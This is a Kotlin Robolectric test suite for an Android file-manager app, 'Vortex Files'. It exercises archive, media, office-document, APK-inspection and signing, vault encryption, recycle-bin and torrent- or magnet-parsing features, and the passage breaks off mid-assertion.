package com.example

import android.content.Context
import android.graphics.Bitmap
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.example.data.db.PlaylistEntity
import com.example.data.db.PlaylistTrackEntity
import com.example.data.db.VortexDatabase
import com.example.data.prefs.formatMiddleEllipsisFilename
import com.example.domain.apk.ApkInspectorEngine
import com.example.domain.apk.ApkSignerAndBuilder
import com.example.domain.apk.BinaryAxmlDecoder
import com.example.domain.archive.ArchiveEngine
import com.example.domain.archive.ArchiveFormat
import com.example.domain.archive.CompressionMode
import com.example.domain.archive.ImageOutputFormat
import com.example.domain.archive.MediaCompressionEngine
import com.example.domain.archive.UniversalReductionRequest
import com.example.domain.archive.UniversalSizeReducer
import com.example.domain.converter.FormatConverterEngine
import com.example.domain.converter.TextTargetFormat
import com.example.domain.download.UniversalDownloadEngine
import com.example.domain.editor.CodeLanguage
import com.example.domain.editor.CodeRunnerEngine
import com.example.domain.editor.IdeAssistant
import com.example.domain.fs.FileCategory
import com.example.domain.fs.MagicBytesDetector
import com.example.domain.fs.RecycleBinManager
import com.example.domain.fs.VirtualFileNode
import com.example.domain.media.AiPhotoStudioEngine
import com.example.domain.media.AudioDspController
import com.example.domain.media.ChannelHslAdjustment
import com.example.domain.media.EqPreset
import com.example.domain.media.HslColorChannel
import com.example.domain.media.ImageOverlayLayer
import com.example.domain.media.LyricsEngine
import com.example.domain.media.OverlayBlendMode
import com.example.domain.media.PhotoStudioParams
import com.example.domain.media.SubtitleEngine
import com.example.domain.office.DocParagraphStyle
import com.example.domain.office.ExcelSheetModel
import com.example.domain.office.ExcelWorkbookModel
import com.example.domain.office.OfficeDocumentEngine
import com.example.domain.office.PptDeckModel
import com.example.domain.office.PptSlideModel
import com.example.domain.office.WordDocumentModel
import com.example.domain.office.WordParagraph
import com.example.domain.security.VaultCryptoEngine
import com.example.shizuku.RootShellManager
import com.example.shizuku.ShizukuManager
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class ExampleRobolectricTest {

  @Test
  fun `read app name from context`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val appName = context.getString(R.string.app_name)
    assertEquals("Vortex Files", appName)
  }

  @Test
  fun `archive engine creates browses and extracts zip and tar_xz`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_arc_${System.currentTimeMillis()}").apply { mkdirs() }
      val sample = File(work, "hello.kt").apply { writeText("fun main() = println(\"Vortex\")") }

      val engine = ArchiveEngine()
      val zipOut = File(work, "bundle.zip")
      engine.createArchive(listOf(sample), zipOut, ArchiveFormat.ZIP, level = 9, password = "secret")
      assertTrue(zipOut.exists() && zipOut.length() > 0)

      val entries = engine.listEntriesAtPath(zipOut, "", password = "secret")
      assertEquals(1, entries.size)
      assertEquals("hello.kt", entries.first().name)

      val extractDir = File(work, "out_zip")
      val extractedCount = engine.extractArchive(zipOut, extractDir, password = "secret")
      assertEquals(1, extractedCount)
      assertEquals("fun main() = println(\"Vortex\")", File(extractDir, "hello.kt").readText())

      val txzOut = File(work, "bundle.tar.xz")
      engine.createArchive(listOf(sample), txzOut, ArchiveFormat.TAR_XZ, level = 6)
      assertTrue(txzOut.exists() && txzOut.length() > 0)
      val txzEntries = engine.listEntriesAtPath(txzOut, "")
      assertEquals(1, txzEntries.size)

      val sevenZOut = File(work, "bundle.7z")
      engine.createArchive(listOf(sample), sevenZOut, ArchiveFormat.SEVEN_Z, level = 7)
      assertTrue(sevenZOut.exists() && sevenZOut.length() > 0)

      work.deleteRecursively()
    }
  }

  @Test
  fun `media compression and text conversion work end to end`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_conv_${System.currentTimeMillis()}").apply { mkdirs() }

      val img = File(work, "sample.png")
      val bmp = Bitmap.createBitmap(64, 64, Bitmap.Config.ARGB_8888)
      FileOutputStream(img).use { bmp.compress(Bitmap.CompressFormat.PNG, 100, it) }
      bmp.recycle()

      val mediaEngine = MediaCompressionEngine()
      val lossy =
        mediaEngine.compressImages(
          listOf(img),
          File(work, "lossy"),
          CompressionMode.LOSSY,
          quality = 60,
          scalePercent = 50,
          targetFormat = ImageOutputFormat.JPEG,
        )
      assertEquals(1, lossy.outputFiles.size)
      assertTrue(!lossy.isLossless)

      val lossless =
        mediaEngine.compressImages(
          listOf(img),
          File(work, "lossless"),
          CompressionMode.LOSSLESS,
          quality = 100,
          scalePercent = 100,
          targetFormat = ImageOutputFormat.BMP,
        )
      assertEquals(1, lossless.outputFiles.size)
      assertTrue(lossless.isLossless)
      assertTrue(lossless.outputFiles.first().name.endsWith(".bmp"))

      val archiveEngine = ArchiveEngine()
      val converter = FormatConverterEngine(context, archiveEngine, mediaEngine)
      val jsonSrc = File(work, "data.json").apply { writeText("{\"app\":\"Vortex\",\"pro\":true}") }
      val xmlOut = File(work, "data.xml")
      converter.convertTextOrData(jsonSrc, xmlOut, TextTargetFormat.XML)
      assertTrue(xmlOut.readText().contains("<app>Vortex</app>"))

      val yamlOut = File(work, "data.yaml")
      converter.convertTextOrData(jsonSrc, yamlOut, TextTargetFormat.YAML)
      assertTrue(yamlOut.readText().contains("app: Vortex"))

      work.deleteRecursively()
    }
  }

  @Test
  fun `ide assistant code runner subtitle engine and universal reducer work`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_phase2_${System.currentTimeMillis()}").apply { mkdirs() }

      // 1. IDE Assistant diagnostics, symbols & formatting
      val ktCode = "fun greet() {\nprintln(\"Hi\")\n"
      val diags = IdeAssistant.analyzeDiagnostics(ktCode, CodeLanguage.KOTLIN)
      assertTrue(diags.any { it.message.contains("Unclosed") })
      val symbols = IdeAssistant.extractSymbols("class Engine\nfun launch() {}", CodeLanguage.KOTLIN)
      assertEquals(2, symbols.size)

      // 2. CodeRunnerEngine (SQL + JSON + Python subset)
      val runner = CodeRunnerEngine(context, ShizukuManager(context), RootShellManager())
      val sqlRes =
        runner.runCode(
          filePath = File(work, "q.sql").absolutePath,
          code = "CREATE TABLE t (id INTEGER, name TEXT); INSERT INTO t VALUES (1, 'Vortex'); SELECT name FROM t;",
          language = CodeLanguage.SQL,
        )
      assertTrue(sqlRes.success)
      assertTrue(sqlRes.stdout.contains("Vortex"))

      val pyRes =
        runner.runCode(
          filePath = File(work, "run.py").absolutePath,
          code = "x = 7\nprint(x * 6)",
          language = CodeLanguage.PYTHON,
        )
      assertTrue(pyRes.success)
      assertTrue(pyRes.stdout.contains("42"))

      // 3. SubtitleEngine SRT parsing & sync offset
      val srt =
        """
        1
        00:00:01,000 --> 00:00:04,000
        مرحبا بكم في فورتكس
        """.trimIndent()
      val cues = SubtitleEngine.parseString(srt)
      assertEquals(1, cues.size)
      val active = SubtitleEngine.findActiveCue(cues, positionMs = 2500L, syncOffsetMs = 0L)
      assertNotNull(active)
      assertEquals("مرحبا بكم في فورتكس", active?.text)

      // 4. UniversalSizeReducer (JSON/Code minify + Image reduction)
      val reducer = UniversalSizeReducer(context, MediaCompressionEngine(), ArchiveEngine())
      val bigJson = File(work, "config.json").apply {
        writeText("{\n  \"alpha\" : 1,\n  \"beta\" : [ 1, 2, 3 ]\n}")
      }
      val node = VirtualFileNode(bigJson.name, bigJson.absolutePath, false, bigJson.length(), 0L)
      val redRes = reducer.reduceFiles(listOf(node), File(work, "out"), UniversalReductionRequest())
      assertEquals(1, redRes.outputFiles.size)
      assertTrue(redRes.reducedBytes < redRes.originalBytes)

      work.deleteRecursively()
    }
  }

  @Test
  fun `lyrics karaoke parser audio dsp controller and custom playlist order work`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()

      // 1. Karaoke Enhanced LRC & standard LRC word lookup
      val rawLrc =
        """
        [00:01.00]<00:01.00>Hello <00:01.50>Vortex <00:02.00>World
        [00:04.00]Second synchronized line
        """.trimIndent()
      val lines = LyricsEngine.parseLyrics(rawLrc)
      assertEquals(2, lines.size)
      assertEquals(3, lines[0].words.size)

      val activeLineIdx = LyricsEngine.findActiveLineIndex(lines, positionMs = 1600L)
      assertEquals(0, activeLineIdx)
      val activeWordIdx = LyricsEngine.findActiveWordIndex(lines[0], positionMs = 1600L)
      assertEquals(1, activeWordIdx) // "Vortex" starts at 1500ms

      // 2. AudioDspController presets & bands
      val dsp = AudioDspController()
      val presetBands = dsp.applyPreset(EqPreset.BASS_HEAVY)
      assertEquals(5, presetBands.size)
      assertEquals(650, presetBands[0].currentLevelMb)
      val updatedBands = dsp.setBandLevel(2, 350)
      assertEquals(350, updatedBands[2].currentLevelMb)
      dsp.setLoudnessGainMb(1200)
      dsp.setBassBoostStrength(750)
      dsp.release()

      // 3. PlaylistDao custom track ordering in Room
      val db = Room.inMemoryDatabaseBuilder(context, VortexDatabase::class.java).allowMainThreadQueries().build()
      val dao = db.playlistDao()
      val pid = dao.insertPlaylist(PlaylistEntity(name = "My Mix"))
      val id1 = dao.insertTrack(PlaylistTrackEntity(playlistId = pid, trackPath = "/a.mp3", title = "Track A", artist = "X", durationMs = 1000L, sortOrder = 0))
      val id2 = dao.insertTrack(PlaylistTrackEntity(playlistId = pid, trackPath = "/b.flac", title = "Track B", artist = "Y", durationMs = 2000L, sortOrder = 1))

      // Swap custom order
      val initial = dao.getPlaylistTracksOnce(pid)
      assertEquals(listOf(id1, id2), initial.map { it.id })
      dao.updateTracks(listOf(initial[1].copy(sortOrder = 0), initial[0].copy(sortOrder = 1)))
      val reordered = dao.getPlaylistTracksOnce(pid)
      assertEquals(listOf("Track B", "Track A"), reordered.map { it.title })
      db.close()
    }
  }

  @Test
  fun `apk inspector decodes binary axml extracts manifest package version and permissions`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_apk_${System.currentTimeMillis()}").apply { mkdirs() }

      // Build a real minimal binary AXML AndroidManifest.xml
      val axmlBytes = buildMinimalBinaryAxml(
        packageName = "com.vortex.sampleapp",
        versionName = "2.4.1",
        versionCode = 42,
        permission = "android.permission.CAMERA",
      )
      val decoded = BinaryAxmlDecoder.decode(axmlBytes)
      assertTrue(decoded.contains("com.vortex.sampleapp"))
      assertTrue(decoded.contains("2.4.1"))
      assertTrue(decoded.contains("android.permission.CAMERA"))

      val apkFile = File(work, "sample_app.apk")
      ZipOutputStream(FileOutputStream(apkFile)).use { zos ->
        zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
        zos.write(axmlBytes)
        zos.closeEntry()

        zos.putNextEntry(ZipEntry("lib/arm64-v8a/libnative.so"))
        zos.write(byteArrayOf(0x7F, 'E'.code.toByte(), 'L'.code.toByte(), 'F'.code.toByte()))
        zos.closeEntry()
      }

      val engine = ApkInspectorEngine(context, ArchiveEngine())
      val report = engine.inspectApk(apkFile)
      assertEquals("com.vortex.sampleapp", report.packageName)
      assertEquals("2.4.1", report.versionName)
      assertEquals(42L, report.versionCode)
      assertTrue(report.permissions.contains("android.permission.CAMERA"))
      assertTrue(report.permissionDetails.first { it.fullName == "android.permission.CAMERA" }.isDangerous)
      assertTrue(report.isManifestBinaryAxml)
      assertEquals(1, report.nativeLibs.size)

      // Test manifest extraction to disk
      val extractedXml = File(work, "extracted_AndroidManifest.xml")
      engine.extractManifestToFile(report.decodedManifestXml, extractedXml)
      assertTrue(extractedXml.exists() && extractedXml.readText().contains("com.vortex.sampleapp"))

      // Test inspecting an APK wrapped inside an outer ZIP via archive:// URI
      val outerZip = File(work, "bundle.zip")
      ZipOutputStream(FileOutputStream(outerZip)).use { zos ->
        zos.putNextEntry(ZipEntry("payload/inner.apk"))
        zos.write(apkFile.readBytes())
        zos.closeEntry()
      }
      val resolvedInner = engine.resolveInspectableApkFile(
        ArchiveEngine.buildArchiveUri(outerZip.absolutePath, "payload/inner.apk"),
        work,
      )
      val innerReport = engine.inspectApk(resolvedInner)
      assertEquals("com.vortex.sampleapp", innerReport.packageName)

      work.deleteRecursively()
    }
  }

  private fun buildMinimalBinaryAxml(
    packageName: String,
    versionName: String,
    versionCode: Int,
    permission: String,
  ): ByteArray {
    val strings = listOf(
      "android",
      "http://schemas.android.com/apk/res/android",
      "manifest",
      "package",
      packageName,
      "versionName",
      versionName,
      "versionCode",
      "uses-permission",
      "name",
      permission,
    )

    // Encode UTF-16LE StringPool
    val strData = ByteArrayOutputStream()
    val offsets = IntArray(strings.size)
    strings.forEachIndexed { idx, s ->
      offsets[idx] = strData.size()
      val len = s.length
      strData.write(len and 0xFF)
      strData.write((len ushr 8) and 0xFF)
      val chars = s.toByteArray(Charsets.UTF_16LE)
      strData.write(chars)
      strData.write(0)
      strData.write(0)
    }
    while (strData.size() % 4 != 0) strData.write(0)

    val strPoolHeaderSize = 28 + offsets.size * 4
    val strPoolChunkSize = strPoolHeaderSize + strData.size()
    val strPoolBuf = ByteBuffer.allocate(strPoolChunkSize).order(ByteOrder.LITTLE_ENDIAN)
    strPoolBuf.putInt(0x001C0001)
    strPoolBuf.putInt(strPoolChunkSize)
    strPoolBuf.putInt(strings.size)
    strPoolBuf.putInt(0) // styleCount
    strPoolBuf.putInt(0) // flags (UTF-16LE)
    strPoolBuf.putInt(strPoolHeaderSize)
    strPoolBuf.putInt(0) // stylesOffset
    offsets.forEach { strPoolBuf.putInt(it) }
    strPoolBuf.put(strData.toByteArray())

    val chunks = ByteArrayOutputStream()
    chunks.write(strPoolBuf.array())

    // START_NAMESPACE (android)
    chunks.write(
      ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN).apply {
        putInt(0x00100100); putInt(24); putInt(1); putInt(-1); putInt(0); putInt(1)
      }.array()
    )

    // START_TAG <manifest package="..." android:versionName="..." android:versionCode="...">
    chunks.write(
      ByteBuffer.allocate(36 + 3 * 20).order(ByteOrder.LITTLE_ENDIAN).apply {
        putInt(0x00100102); putInt(36 + 60); putInt(2); putInt(-1)
        putInt(-1); putInt(2) // ns=-1, name="manifest"
        putShort(20); putShort(20); putShort(3); putShort(0); putShort(0); putShort(0)
        // attr 0: package="..."
        putInt(-1); putInt(3); putInt(4); putInt(0x03 shl 24); putInt(4)
        // attr 1: android:versionName="..."
        putInt(1); putInt(5); putInt(6); putInt(0x03 shl 24); putInt(6)
        // attr 2: android:versionCode=42 (int type 0x10)
        putInt(1); putInt(7); putInt(-1); putInt(0x10 shl 24); putInt(versionCode)
      }.array()
    )

    // START_TAG <uses-permission android:name="...">
    chunks.write(
      ByteBuffer.allocate(36 + 20).order(ByteOrder.LITTLE_ENDIAN).apply {
        putInt(0x00100102); putInt(36 + 20); putInt(3); putInt(-1)
        putInt(-1); putInt(8) // name="uses-permission"
        putShort(20); putShort(20); putShort(1); putShort(0); putShort(0); putShort(0)
        putInt(1); putInt(9); putInt(10); putInt(0x03 shl 24); putInt(10)
      }.array()
    )

    // END_TAG </uses-permission>
    chunks.write(
      ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN).apply {
        putInt(0x00100103); putInt(24); putInt(3); putInt(-1); putInt(-1); putInt(8)
      }.array()
    )

    // END_TAG </manifest>
    chunks.write(
      ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN).apply {
        putInt(0x00100103); putInt(24); putInt(4); putInt(-1); putInt(-1); putInt(2)
      }.array()
    )

    val body = chunks.toByteArray()
    val totalSize = 8 + body.size
    return ByteBuffer.allocate(totalSize).order(ByteOrder.LITTLE_ENDIAN).apply {
      putInt(0x00080003)
      putInt(totalSize)
      put(body)
    }.array()
  }

  @Test
  fun `multi-language i18n view modes open-as modes and range selection work`() {
    val context = ApplicationProvider.getApplicationContext<Context>()

    // 1. All 7 languages resolve cleanly with proper RTL/LTR flags
    val allLangs = com.example.i18n.AppLanguage.entries
    assertEquals(7, allLangs.size)
    allLangs.forEach { lang ->
      val s = com.example.i18n.stringsForLanguage(lang)
      assertTrue(s.openWithExternalApp.isNotBlank())
      assertTrue(s.readAsTitle.isNotBlank())
      assertTrue(s.viewModeGallery.isNotBlank())
      assertEquals(lang == com.example.i18n.AppLanguage.AR, lang.isRtl)
    }
    assertEquals("Ouvrir avec une app externe", com.example.i18n.stringsForLanguage(com.example.i18n.AppLanguage.FR).openWithExternalApp)

    // 2. OpenAsMode and FolderViewMode enums cover all requested modes
    assertEquals(10, com.example.ui.components.OpenAsMode.entries.size)
    assertEquals("hex", com.example.ui.components.OpenAsMode.HEX.routeParam)
    assertEquals("image", com.example.ui.components.OpenAsMode.IMAGE.routeParam)
    assertEquals(5, com.example.ui.viewmodel.FolderViewMode.entries.size)

    // 3. Language-specific extension detection differentiates Python, Kotlin, JS, JSON, SQL
    val pyNode = VirtualFileNode("bot.py", "/tmp/bot.py", false, 120L, 0L)
    val ktNode = VirtualFileNode("Main.kt", "/tmp/Main.kt", false, 120L, 0L)
    val jsonNode = VirtualFileNode("data.json", "/tmp/data.json", false, 120L, 0L)
    assertEquals(CodeLanguage.PYTHON, CodeLanguage.detect(pyNode.name))
    assertEquals(CodeLanguage.KOTLIN, CodeLanguage.detect(ktNode.name))
    assertEquals(CodeLanguage.JSON, CodeLanguage.detect(jsonNode.name))

    // 4. WorkbenchViewModel supports view mode switching and drag-range selection
    val container = VortexAppContainer(context)
    val vm = com.example.ui.viewmodel.WorkbenchViewModel(context, container)
    vm.setPaneViewMode(com.example.ui.viewmodel.PaneId.LEFT, com.example.ui.viewmodel.FolderViewMode.GALLERY)
    assertEquals(com.example.ui.viewmodel.FolderViewMode.GALLERY, vm.panes.value[0].viewMode)

    vm.setSelectedRange(com.example.ui.viewmodel.PaneId.LEFT, setOf("/a.png", "/b.png", "/c.png"))
    assertEquals(setOf("/a.png", "/b.png", "/c.png"), vm.panes.value[0].selectedPaths)
    vm.clearSelection(com.example.ui.viewmodel.PaneId.LEFT)
    assertTrue(vm.panes.value[0].selectedPaths.isEmpty())
  }

  @Test
  fun `magic bytes detector identifies mismatched extensions and proposes readers`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val work = File(context.cacheDir, "test_magic_${System.currentTimeMillis()}").apply { mkdirs() }

    val disguisedPng = File(work, "secret_photo.txt")
    val bmp = Bitmap.createBitmap(16, 16, Bitmap.Config.ARGB_8888)
    FileOutputStream(disguisedPng).use { bmp.compress(Bitmap.CompressFormat.PNG, 100, it) }
    bmp.recycle()

    val pngDetection = MagicBytesDetector.inspectFile(disguisedPng)
    assertEquals("png", pngDetection.suggestedExtension)
    assertEquals(FileCategory.IMAGE, pngDetection.category)
    assertFalse(pngDetection.matchesCurrentExtension)
    assertTrue(pngDetection.compatibleReaderIds.contains("image"))

    val disguisedPdf = File(work, "invoice.bin").apply {
      writeBytes("%PDF-1.7\n1 0 obj\n<<>>\nendobj".toByteArray(Charsets.US_ASCII))
    }
    val pdfDetection = MagicBytesDetector.inspectFile(disguisedPdf)
    assertEquals("pdf", pdfDetection.suggestedExtension)
    assertEquals(FileCategory.PDF, pdfDetection.category)
    assertFalse(pdfDetection.matchesCurrentExtension)
    assertTrue(pdfDetection.compatibleReaderIds.contains("pdf"))

    work.deleteRecursively()
  }

  @Test
  fun `vault crypto engine encrypts and unlocks files and folders with password or recovery key`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_vault_${System.currentTimeMillis()}").apply { mkdirs() }

      // 1. Single file lock + unlock by password
      val secretFile = File(work, "credentials.txt").apply { writeText("TOP_SECRET_VORTEX_DATA") }
      val lockRes = VaultCryptoEngine.lockTarget(secretFile, "myPass123", deleteOriginal = true)
      assertFalse(secretFile.exists())
      assertTrue(lockRes.lockedFile.exists())
      assertTrue(lockRes.recoveryKey.startsWith("VORTEX-"))

      // Wrong password must fail
      val wrongFailed = runCatching {
        VaultCryptoEngine.unlockTarget(lockRes.lockedFile, "wrong_pass", deleteLockedAfter = false)
      }.isFailure
      assertTrue(wrongFailed)

      val unlockByPwd = VaultCryptoEngine.unlockTarget(lockRes.lockedFile, "myPass123", deleteLockedAfter = true)
      assertTrue(unlockByPwd.restoredFile.exists())
      assertEquals("TOP_SECRET_VORTEX_DATA", unlockByPwd.restoredFile.readText())
      assertFalse(lockRes.lockedFile.exists())

      // 2. Directory lock + unlock by recovery key
      val folder = File(work, "private_docs").apply { mkdirs() }
      File(folder, "note.md").writeText("# Private Notes")
      val dirLockRes = VaultCryptoEngine.lockTarget(folder, "dirPass99", deleteOriginal = true)
      assertFalse(folder.exists())
      assertTrue(dirLockRes.wasDirectory)

      val unlockByKey = VaultCryptoEngine.unlockTarget(dirLockRes.lockedFile, dirLockRes.recoveryKey, deleteLockedAfter = true)
      assertTrue(unlockByKey.wasDirectory)
      assertTrue(File(unlockByKey.restoredFile, "note.md").exists())
      assertEquals("# Private Notes", File(unlockByKey.restoredFile, "note.md").readText())

      work.deleteRecursively()
    }
  }

  @Test
  fun `recycle bin moves restores auto-purges expired and empties trash`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_trash_${System.currentTimeMillis()}").apply { mkdirs() }
      val db = Room.inMemoryDatabaseBuilder(context, VortexDatabase::class.java).allowMainThreadQueries().build()
      val trashDao = db.trashDao()
      val manager = RecycleBinManager(context, trashDao)

      val f1 = File(work, "alpha.txt").apply { writeText("alpha") }
      val f2 = File(work, "beta.txt").apply { writeText("beta") }
      val moved = manager.moveToTrash(
        nodes = listOf(
          VirtualFileNode(f1.name, f1.absolutePath, false, f1.length(), 0L),
          VirtualFileNode(f2.name, f2.absolutePath, false, f2.length(), 0L),
        ),
        retentionDays = 7,
      )
      assertEquals(2, moved)
      assertFalse(f1.exists())
      assertFalse(f2.exists())

      val entries = trashDao.getAllOnce()
      assertEquals(2, entries.size)

      // Restore first entry
      assertTrue(manager.restoreEntry(entries[0]))
      assertTrue(f1.exists())
      assertEquals("alpha", f1.readText())

      // Simulate expiry in the far future -> purges remaining entry
      val purged = manager.purgeExpired(nowMillis = System.currentTimeMillis() + 30L * 86_400_000L)
      assertEquals(1, purged)
      assertTrue(trashDao.getAllOnce().isEmpty())

      db.close()
      work.deleteRecursively()
    }
  }

  @Test
  fun `apk signer and builder creates signed apk with v1 jar and v2 signing block`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_apksign_${System.currentTimeMillis()}").apply { mkdirs() }

      val axmlBytes = buildMinimalBinaryAxml("com.vortex.signed", "1.0.0", 1, "android.permission.INTERNET")
      val baseApk = File(work, "base.apk")
      ZipOutputStream(FileOutputStream(baseApk)).use { zos ->
        zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
        zos.write(axmlBytes)
        zos.closeEntry()
      }
      val apksBundle = File(work, "bundle.apks")
      ZipOutputStream(FileOutputStream(apksBundle)).use { zos ->
        zos.putNextEntry(ZipEntry("base-master.apk"))
        zos.write(baseApk.readBytes())
        zos.closeEntry()
      }

      val signer = ApkSignerAndBuilder()
      val signedOut = File(work, "merged_signed.apk")
      val result = signer.convertToSignedApk(apksBundle, signedOut)
      assertTrue(result.v1Signed)
      assertTrue(result.v2Signed)
      assertTrue(signedOut.exists() && signedOut.length() > 0)

      val verification = signer.verifyApkSignatureBlock(signedOut)
      assertTrue(verification.hasV1JarSignature)
      assertTrue(verification.hasV2ApkSigBlock)
      assertTrue(verification.v2SchemeIdPresent)
      assertTrue(verification.eocdValid)

      work.deleteRecursively()
    }
  }

  @Test
  fun `office suite reads writes docx xlsx formulas pptx and photo hsl overlay`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "test_office_${System.currentTimeMillis()}").apply { mkdirs() }
      val office = OfficeDocumentEngine()

      // 1. Word DOCX
      val docxFile = File(work, "report.docx")
      office.saveDocx(
        WordDocumentModel(
          title = "Report",
          paragraphs = listOf(
            WordParagraph("1", "Executive Summary", DocParagraphStyle.HEADING1),
            WordParagraph("2", "Built natively in Vortex Files.", DocParagraphStyle.BODY),
          ),
        ),
        docxFile,
      )
      val readDocx = office.readDocx(docxFile)
      assertEquals(2, readDocx.paragraphs.size)
      assertEquals("Executive Summary", readDocx.paragraphs[0].text)

      // 2. Excel XLSX + Formula Evaluation
      val sheet = ExcelSheetModel(
        "Sales",
        mutableListOf(
          mutableListOf("10", "2"),
          mutableListOf("20", "=A1*B1"),
          mutableListOf("=SUM(A1:A2)", "=AVG(A1:A2)"),
        ),
      )
      assertEquals("20", office.evaluateCellDisplay(sheet, 1, 1))
      assertEquals("30", office.evaluateCellDisplay(sheet, 2, 0))
      assertEquals("15", office.evaluateCellDisplay(sheet, 2, 1))

      val xlsxFile = File(work, "budget.xlsx")
      office.saveXlsx(ExcelWorkbookModel(mutableListOf(sheet)), xlsxFile)
      val readXlsx = office.readXlsx(xlsxFile)
      assertEquals("=SUM(A1:A2)", readXlsx.sheets.first().rows[2][0])

      // 3. PowerPoint PPTX
      val pptFile = File(work, "deck.pptx")
      office.savePptx(
        PptDeckModel(mutableListOf(PptSlideModel(0, "Vortex Launch", "Offline OOXML Suite"))),
        pptFile,
      )
      val readPpt = office.readPptx(pptFile)
      assertEquals(1, readPpt.slides.size)
      assertEquals("Vortex Launch", readPpt.slides[0].title)

      // 4. AI Photo Studio HSL + Overlay Processing
      val baseBmp = Bitmap.createBitmap(40, 40, Bitmap.Config.ARGB_8888)
      baseBmp.eraseColor(android.graphics.Color.RED)
      val overlayBmp = Bitmap.createBitmap(16, 16, Bitmap.Config.ARGB_8888)
      overlayBmp.eraseColor(android.graphics.Color.BLUE)

      val studio = AiPhotoStudioEngine()
      val edited = studio.processWithHslAndOverlay(
        source = baseBmp,
        params = PhotoStudioParams(
          contrast = 1.15f,
          channelAdjustments = mapOf(HslColorChannel.RED to ChannelHslAdjustment(hueShift = 20f)),
        ),
        overlay = ImageOverlayLayer(overlayBitmap = overlayBmp, opacity = 0.7f, blendMode = OverlayBlendMode.NORMAL),
      )
      assertEquals(40, edited.width)
      assertEquals(40, edited.height)
      baseBmp.recycle()
      overlayBmp.recycle()
      edited.recycle()

      work.deleteRecursively()
    }
  }

  @Test
  fun `bencode torrent parser magnet parser long filename ellipsis and idempotent selectAll work`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val db = Room.inMemoryDatabaseBuilder(context, VortexDatabase::class.java).allowMainThreadQueries().build()
    val dlEngine = UniversalDownloadEngine(db.downloadDao())

    // 1. Magnet URI parsing
    val magnet = dlEngine.parseMagnetUri(
      "magnet:?xt=urn:btih:0123456789ABCDEF0123456789ABCDEF01234567&dn=Ubuntu+ISO&tr=udp%3A%2F%2Ftracker.example.com%3A6969&ws=https%3A%2F%2Fmirror.example.com%2Fubuntu.iso"
    )
    assertNotNull(magnet)
    assertEquals("0123456789ABCDEF0123456789ABCDEF01234567", magnet?.infoHash)
    assertEquals("Ubuntu ISO", magnet?.displayName)
    assertEquals(1, magnet?.webSeeds?.size)

    // 2. Bencode torrent parsing
    val torrentBytes = (
      "d8:announce23:http://tracker.test/ann4:infod6:lengthi1048576e4:name10:sample.bin12:piece lengthi16384e6:pieces20:01234567890123456789ee"
      ).toByteArray(Charsets.US_ASCII)
    val meta = dlEngine.parseTorrentBytes(torrentBytes)
    assertEquals("sample.bin", meta.name)
    assertEquals(1048576L, meta.totalBytes)
    assertEquals("http://tracker.test/ann", meta.trackers.first())

    // 3. Long filename middle ellipsis preserves full extension
    val formatted = formatMiddleEllipsisFilename("very_long_annual_financial_statement_2026_final_v2.xlsx", maxChars = 24)
    assertTrue(formatted.endsWith(".xlsx"))
    assertTrue(formatted.contains("…"))

    // 4. Select All toggle (selects all when partially or not selected, deselects all when all selected)
    val toggleDir = File(context.cacheDir, "vortex_select_all_test").apply {
      deleteRecursively()
      mkdirs()
    }
    val fAlpha = File(toggleDir, "alpha.txt").apply { writeText("1") }
    File(toggleDir, "beta.txt").writeText("2")
    val container = VortexAppContainer(context)
    val vm = com.example.ui.viewmodel.WorkbenchViewModel(context, container)
    vm.navigatePane(com.example.ui.viewmodel.PaneId.LEFT, toggleDir.absolutePath)
    val deadline = System.currentTimeMillis() + 3000L
    while (vm.panes.value[0].items.size < 2 && System.currentTimeMillis() < deadline) {
      org.robolectric.shadows.ShadowLooper.idleMainLooper()
      Thread.sleep(25)
    }
    assertEquals(2, vm.panes.value[0].items.size)
    // Partial selection -> selectAll must complete selection to all 2 items
    vm.toggleSelection(com.example.ui.viewmodel.PaneId.LEFT, fAlpha.absolutePath)
    assertEquals(1, vm.panes.value[0].selectedPaths.size)
    vm.selectAll(com.example.ui.viewmodel.PaneId.LEFT)
    assertEquals(2, vm.panes.value[0].selectedPaths.size)
    // Pressing selectAll again when all are selected must deselect all
    vm.selectAll(com.example.ui.viewmodel.PaneId.LEFT)
    assertEquals(emptySet<String>(), vm.panes.value[0].selectedPaths)
    toggleDir.deleteRecursively()

    // 5. Smart YouTube ID extraction & direct media URL classification
    assertEquals(
      "dQw4w9WgXcQ",
      UniversalDownloadEngine.extractYouTubeVideoId("https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=10s"),
    )
    assertEquals(
      "dQw4w9WgXcQ",
      UniversalDownloadEngine.extractYouTubeVideoId("https://youtu.be/dQw4w9WgXcQ?si=abc"),
    )
    assertEquals(
      "abcDEF_1234",
